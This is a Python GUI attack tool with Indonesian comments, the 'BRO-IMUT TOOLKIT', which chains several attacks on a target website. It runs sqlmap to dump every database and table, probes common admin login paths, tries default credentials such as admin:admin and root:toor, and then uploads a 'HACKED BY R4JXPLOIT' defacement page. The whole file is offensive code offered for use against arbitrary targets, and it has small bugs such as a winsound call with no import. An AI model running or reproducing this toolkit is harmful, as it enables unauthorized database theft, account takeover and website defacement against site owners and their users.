import tkinter as tk
from tkinter import ttk, messagebox
import threading
import subprocess
import os
import requests
import datetime

# Simpan hasil ke folder
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

def log_to_file(content):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    with open(f"{log_dir}/scan_{timestamp}.txt", "a", encoding="utf-8") as f:
        f.write(content + "\n")

# Deface content
DEFACE_HTML = """
<html>
  <head><title>HACKED BY BRO R4JXPLOIT 💀</title></head>
  <body style='background:black;color:white;text-align:center;'>
    <h1 style='font-size:60px;'>HACKED BY R4JXPLOIT 💀</h1>
    <p style='font-size:24px;'>NGAPAIN DEFACE KECE? MAU PAMER? KUCUP KAYAK GINI AJA BRO NUNJUKIN LU ITU KECE 😎</p>
  </body>
</html>
"""

def run_sqlmap(target_url, log_box):
    def log(msg):
        log_box.insert(tk.END, msg + "\n")
        log_box.see(tk.END)
        log_to_file(msg)

    log(f"[+] Scan target: {target_url}")
    try:
        subprocess.run([
            "sqlmap", "-u", target_url, "--batch", "--random-agent", "--dbs",
            f"--output-dir=dumps"
        ])
        subprocess.run([
            "sqlmap", "-u", target_url, "--batch", "--random-agent", "--tables",
            f"--output-dir=dumps"
        ])
        subprocess.run([
            "sqlmap", "-u", target_url, "--batch", "--random-agent", "--dump-all",
            f"--output-dir=dumps"
        ])

        log("[✔] Dump complete! Cek folder 'dumps/'")
        winsound.Beep(1000, 500)  # Bunyi notif
        check_admin_login(target_url, log_box)

    except Exception as e:
        log(f"[!] Error: {str(e)}")


def check_admin_login(base_url, log_box):
    def log(msg):
        log_box.insert(tk.END, msg + "\n")
        log_box.see(tk.END)
        log_to_file(msg)

    paths = ["/admin", "/login", "/wp-login.php", "/cpanel", "/user/login"]
    found = False
    for path in paths:
        full = base_url.rstrip("/") + path
        try:
            r = requests.get(full, timeout=5)
            if r.status_code == 200 and ("login" in r.text.lower() or "username" in r.text.lower()):
                log(f"[✔] Panel login ditemukan: {full}")
                found = True
                try_login(full, log_box)
        except:
            continue
    if not found:
        log("[-] Gagal menemukan login panel.")


def try_login(url, log_box):
    def log(msg):
        log_box.insert(tk.END, msg + "\n")
        log_box.see(tk.END)
        log_to_file(msg)

    creds = [("admin", "admin"), ("admin", "123456"), ("root", "toor")]
    for u, p in creds:
        try:
            r = requests.post(url, data={"username": u, "password": p}, timeout=5)
            if "logout" in r.text or r.status_code == 302:
                log(f"[🔥] Login berhasil: {u}:{p}")
                winsound.Beep(1500, 300)
                auto_deface(url, log_box)
                return
        except:
            continue
    log("[x] Tidak berhasil login dengan default credentials.")


def auto_deface(url, log_box):
    def log(msg):
        log_box.insert(tk.END, msg + "\n")
        log_box.see(tk.END)
        log_to_file(msg)

    try:
        files = {"file": ('index.html', DEFACE_HTML, 'text/html')}
        r = requests.post(url, files=files, timeout=5)
        if r.status_code == 200:
            log(f"[✔] Halaman berhasil dideface!")
        else:
            log(f"[x] Gagal deface (status: {r.status_code})")
    except Exception as e:
        log(f"[!] Error saat deface: {str(e)}")


# GUI
root = tk.Tk()
root.title("BRO-IMUT TOOLKIT — Auto SQLi + Login + Deface")
root.geometry("800x550")

frame = ttk.Frame(root, padding=20)
frame.pack(fill="both", expand=True)

entry_label = ttk.Label(frame, text="Masukkan Target URL:")
entry_label.pack(anchor="w")

entry_url = ttk.Entry(frame, width=90)
entry_url.pack(fill="x")

btn = ttk.Button(frame, text="🚀 Start Brutal Attack", command=lambda: threading.Thread(target=run_sqlmap, args=(entry_url.get(), log_box)).start())
btn.pack(pady=10)

log_box = tk.Text(frame, wrap="word")
log_box.pack(fill="both", expand=True)

root.mainloop()
